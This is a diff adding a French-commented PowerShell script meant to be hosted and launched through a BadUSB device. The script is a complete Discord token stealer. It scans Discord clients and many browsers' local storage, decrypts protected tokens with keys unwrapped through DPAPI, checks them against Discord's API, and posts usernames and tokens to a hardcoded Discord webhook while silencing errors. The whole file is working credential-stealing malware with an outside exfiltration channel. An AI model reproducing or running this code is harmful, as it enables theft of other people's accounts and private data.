@@ -1,0 +1,178 @@
+# discord_token.ps1 - a heberger, puis lancer via BadUSB
+$ErrorActionPreference='SilentlyContinue'
+$ProgressPreference='SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+Add-Type -AssemblyName System.Security
+Add-Type -AssemblyName System.Security.Cryptography.ProtectedData
+
+$webhook='https://discord.com/api/webhooks/1537813377856839784/4f5ACCkcEdc36UuQ9bi45eK7pG-PsVhYYiHWUqATbDuIHhAVfqMqqVlT5oIjuzuV39Ay'                                   # optionnel : URL de webhook Discord
+$dirs=New-Object Collections.Generic.List[string]
+$keys=New-Object Collections.Generic.List[byte[]]
+$fileCount=0
+
+foreach($appName in 'discord','discordcanary','discordptb','discorddevelopment'){
+    $ldb=Join-Path $env:APPDATA "$appName\Local Storage\leveldb"
+    if(Test-Path $ldb){$dirs.Add($ldb)}
+    $st=Join-Path $env:APPDATA "$appName\Local State"
+    if(Test-Path $st){
+        try{
+            $kb=[Convert]::FromBase64String((Get-Content $st -Raw|ConvertFrom-Json).os_crypt.encrypted_key)
+            $keys.Add([byte[]]($kb[5..($kb.Length-1)]))
+        }catch{}
+    }
+}
+
+# Discord version Microsoft Store
+Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory -EA 0|?{$_.Name -like 'Discord*'}|%{
+    $ldb=Join-Path $_.FullName 'LocalCache\Roaming\discord\Local Storage\leveldb'
+    if(Test-Path $ldb){$dirs.Add($ldb)}
+    $st=Join-Path $_.FullName 'LocalCache\Roaming\discord\Local State'
+    if(Test-Path $st){
+        try{
+            $kb=[Convert]::FromBase64String((Get-Content $st -Raw|ConvertFrom-Json).os_crypt.encrypted_key)
+            $keys.Add([byte[]]($kb[5..($kb.Length-1)]))
+        }catch{}
+    }
+}
+
+# Navigateurs
+$rootList=@(
+ "$env:LOCALAPPDATA\Google\Chrome\User Data",
+ "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
+ "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
+ "$env:LOCALAPPDATA\Chromium\User Data",
+ "$env:LOCALAPPDATA\Vivaldi\User Data",
+ "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data",
+ "$env:LOCALAPPDATA\Arc\User Data",
+ "$env:LOCALAPPDATA\Programs\Opera",
+ "$env:APPDATA\Opera Software\Opera Stable",
+ "$env:APPDATA\Opera Software\Opera GX Stable")
+foreach($rootPath in $rootList){
+    if(-not(Test-Path $rootPath)){continue}
+    $ldb=Join-Path $rootPath 'Local Storage\leveldb'
+    if(Test-Path $ldb){$dirs.Add($ldb)}
+    Get-ChildItem -LiteralPath $rootPath -Directory|?{$_.Name -eq 'Default' -or $_.Name -like 'Profile*'}|%{
+        $profPath=Join-Path $_.FullName 'Local Storage\leveldb'
+        if(Test-Path $profPath){$dirs.Add($profPath)}
+    }
+}
+$ffBase="$env:APPDATA\Mozilla\Firefox\Profiles"
+if(Test-Path $ffBase){
+    Get-ChildItem $ffBase -Directory|%{
+        $profPath=Join-Path $_.FullName 'storage\default'
+        if(Test-Path $profPath){$dirs.Add($profPath)}
+    }
+}
+
+function Get-SharedBytes($path){
+    try{
+        $fs=[IO.File]::Open($path,3,1,3)
+        $ms=New-Object IO.MemoryStream
+        $fs.CopyTo($ms); $fs.Dispose()
+        return $ms.ToArray()
+    }catch{return $null}
+}
+
+function Decrypt-Gcm($blob,$key){
+    try{
+        $hdr=[Text.Encoding]::ASCII.GetString([byte[]]($blob[0..2]))
+        if($hdr -notmatch '^v\d\d$'){
+            return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($blob,$null,'CurrentUser'))
+        }
+        $nonce=[byte[]]($blob[3..14])
+        $ctLen=$blob.Length - 31
+        if($ctLen -le 0){return $null}
+        $ctBuf=New-Object byte[] $ctLen
+        [Array]::Copy($blob,15,$ctBuf,0,$ctLen)
+        $aes=[Security.Cryptography.Aes]::Create()
+        $aes.Mode='ECB'; $aes.Padding='None'; $aes.Key=$key
+        $enc=$aes.CreateEncryptor()
+        $ctrBuf=New-Object byte[] 16
+        [Array]::Copy($nonce,0,$ctrBuf,0,12)
+        $ctrBuf[15]=2
+        $ksBuf=New-Object byte[] 16
+        $ptBuf=New-Object byte[] $ctLen
+        for($idx=0;$idx -lt $ctLen;$idx+=16){
+            [void]$enc.TransformBlock($ctrBuf,0,16,$ksBuf,0)
+            $cnt=[Math]::Min(16,$ctLen-$idx)
+            for($jj=0;$jj -lt $cnt;$jj++){$ptBuf[$idx+$jj]=$ctBuf[$idx+$jj] -bxor $ksBuf[$jj]}
+            for($zz=15;$zz -ge 12;$zz--){if($ctrBuf[$zz] -eq 255){$ctrBuf[$zz]=0}else{$ctrBuf[$zz]++;break}}
+        }
+        return [Text.Encoding]::UTF8.GetString($ptBuf)
+    }catch{return $null}
+}
+
+$found=@{}
+$encBlobs=New-Object Collections.Generic.List[string]
+$strictRx=[regex]'[\w-]{23,28}\.[\w-]{6}\.[\w-]{27,40}'
+$mfaRx=[regex]'mfa\.[\w-]{80,90}'
+$encRx=[regex]'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})'
+
+foreach($dr in ($dirs|Select-Object -Unique)){
+    Get-ChildItem -LiteralPath $dr -File -Recurse -EA 0|?{$_.Length -lt 52428800}|%{
+        $fileCount++
+        $rawData=Get-SharedBytes $_.FullName
+        if($rawData){
+            $text=[Text.Encoding]::UTF8.GetString($rawData)
+            foreach($mm in $strictRx.Matches($text)){$found[$mm.Value]=$_.FullName}
+            foreach($mm in $mfaRx.Matches($text)){$found[$mm.Value]=$_.FullName}
+            foreach($mm in $encRx.Matches($text)){$encBlobs.Add($mm.Groups[1].Value)}
+        }
+    }
+}
+
+foreach($b64 in ($encBlobs|Select-Object -Unique)){
+    $rawBlob=[Convert]::FromBase64String($b64)
+    foreach($kblob in $keys){
+        $tok=Decrypt-Gcm $rawBlob $kblob
+        if($tok){
+            $tok=$tok.Trim()
+            if($tok -match $strictRx){$found[$tok]='(chiffre/DPAPI)';break}
+        }
+    }
+}
+
+if($found.Count -eq 0){
+    $broadRx=[regex]'[\w-]{18,45}\.[\w-]{4,12}\.[\w-]{15,70}'
+    $candList=New-Object Collections.Generic.List[string]
+    foreach($dr in ($dirs|Select-Object -Unique)){
+        Get-ChildItem -LiteralPath $dr -File -Recurse -EA 0|?{$_.Length -lt 52428800}|%{
+            $rawData=Get-SharedBytes $_.FullName
+            if($rawData){
+                $text=[Text.Encoding]::UTF8.GetString($rawData)
+                foreach($mm in $broadRx.Matches($text)){
+                    if($candList.Count -lt 25 -and -not $candList.Contains($mm.Value)){
+                        $candList.Add($mm.Value); $found[$mm.Value]='(large)'
+                    }
+                }
+            }
+        }
+    }
+}
+
+$rows=@()
+foreach($tkey in $found.Keys){
+    $row=[ordered]@{Token=$tkey;Valide='?';User='-';ID='-';Mail='-';Source=$found[$tkey]}
+    try{
+        $resp=Invoke-RestMethod 'https://discord.com/api/v10/users/@me' -Headers @{Authorization=$tkey} -TimeoutSec 6
+        $row.Valide='OUI'; $row.User=$resp.username; $row.ID=$resp.id; $row.Mail=$resp.email
+        if($resp.discriminator -and $resp.discriminator -ne '0'){$row.User="$($resp.username)#$($resp.discriminator)"}
+    }catch{}
+    $rows+=[pscustomobject]$row
+}
+
+if($webhook -and $rows.Count -gt 0){
+    $msg=($rows|%{$_.User+' | '+$_.Token}) -join "`n"
+    Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body (@{content=$msg}|ConvertTo-Json)
+}
+
+$outFile="$env:USERPROFILE\Desktop\discord_tokens.txt"
+if(-not(Test-Path "$env:USERPROFILE\Desktop")){$outFile="$env:TEMP\discord_tokens.txt"}
+$txtOut="=== DISCORD TOKENS :: $env:COMPUTERNAME :: $(Get-Date) ===`r`n"
+$txtOut+="Dossiers: $(($dirs|Select-Object -Unique).Count) | Fichiers: $fileCount | Cles: $($keys.Count) | Tokens: $($found.Count)`r`n`r`n"
+if($rows.Count -gt 0){$txtOut+=(($rows|Sort-Object Valide -Descending|Format-List|Out-String))}
+else{$txtOut+="AUCUN TOKEN TROUVE.`r`n"+(($dirs|Select-Object -Unique) -join "`r`n")}
+$txtOut|Set-Content $outFile -Encoding UTF8
+$best=($rows|Sort-Object Valide -Descending|Select-Object -First 1).Token
+if($best){Set-Clipboard -Value $best}
+Start-Process notepad.exe $outFile
